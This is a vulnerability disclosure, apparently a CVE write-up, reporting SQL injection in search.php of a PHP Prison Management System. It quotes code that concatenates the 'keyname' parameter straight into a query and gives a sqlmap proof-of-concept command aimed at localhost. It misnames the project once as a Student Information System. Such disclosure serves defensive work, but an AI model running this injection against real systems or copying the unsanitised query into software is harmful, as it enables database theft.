# Prison Management System

## supplier 
https://code-projects.org/prison-management-system-in-php-with-source-code/
## Vulnerability file
search.php

## describe

In the search.php file of Student Information System, keyname username parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

Line 4-20 in search.php

```php
$searchTerm = trim($_GET["keyname"]);
if($searchTerm == "")
{
	echo "Enter name you are searching for.";
	exit();
}

//database connection info
$host = "localhost"; //server
$db = "prisonpro"; //database name
$user = "root"; //dabases user name
$pwd = ""; //password

$link = mysqli_connect($host, $user, $pwd, $db);

$query ="SELECT * FROM registration WHERE id LIKE '%$searchTerm%'";
$results = mysqli_query($link, $query);
```

## POC

```
python sqlmap.py -u "http://127.0.0.1:8083/prison/admin/search.php?keyname=1" --tamper randomcase.py --batch --dbs
```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/d970ae19-ad57-4a39-9b0e-46df012509ea.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/6658387c-c140-493f-ac54-891b5d8a3d15.png)